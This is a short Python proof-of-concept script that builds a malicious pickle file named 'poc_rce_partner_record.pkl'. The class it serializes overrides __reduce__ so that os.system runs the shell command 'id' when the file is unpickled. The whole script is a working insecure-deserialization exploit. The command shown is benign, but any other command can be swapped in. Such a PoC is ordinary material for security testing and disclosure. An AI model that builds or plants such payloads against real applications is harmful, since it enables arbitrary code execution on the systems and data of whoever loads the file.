import pickle


class RCEPayload:
    def __reduce__(self):
        import os
        return (os.system, ("id",))


with open("poc_rce_partner_record.pkl", "wb") as f:
    pickle.dump(RCEPayload(), f)

print("Wrote poc_rce_partner_record.pkl")
